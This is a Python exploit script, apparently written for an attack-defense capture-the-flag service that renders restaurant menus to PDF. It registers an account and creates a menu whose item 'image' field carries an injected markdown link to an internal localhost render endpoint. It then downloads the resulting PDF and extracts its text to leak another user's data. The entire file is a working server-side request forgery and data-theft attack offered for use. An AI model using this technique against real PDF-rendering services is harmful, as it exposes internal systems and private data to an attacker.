#!/usr/bin/env python3

import sys
import requests
import textract

PORT = 8080


def register(s: requests.Session, base: str, login: str, password: str):
    return s.post(base + '/signup', json={'username': login, 'password': password})


def login(s: requests.Session, base: str, login: str, password: str):
    return s.post(base + '/login', json={'username': login, 'password': password})


def create_menu(s: requests.Session, base: str, name: str):
    return s.post(base + '/create', json={'name': name})


def update_menu(s: requests.Session, base: str, update: dict):
    update_menu_req = {
        'menu': update
    }
    return s.post(base + '/update', json=update_menu_req)


def render_menu(s: requests.Session, base: str, mid: str):
    return s.get(base + f'/render/{mid}')


def main(host, hint):
    url = f"http://{host}:{PORT}"

    us = requests.Session()
    register(us, url, "exploituser", "exploituserpass")
    login(us, url, "exploituser", "exploituserpass")
    menu_cr = create_menu(us, url, "exploit")
    menu_id = menu_cr.json()['id']
    menu_json = menu_cr.json()
    menu_json['categories'] = [
        {'name': 'payload',
         'items': [
             {
                 'name': 'payload',
                 'price': 3000,
                 'description': 'pld',
                 'image': f'test/?a=)![t](http://localhost:8081/api/render/{hint}#.pdf)'
             },
         ]}
    ]
    update_menu(us, url, menu_json)

    rendered = render_menu(us, url, menu_id)
    with open('pwn.pdf', 'wb') as f:
        f.write(rendered.content)
    print(textract.process("pwn.pdf", encoding='utf-8'), flush=True)


if __name__ == '__main__':
    main(sys.argv[1], sys.argv[2])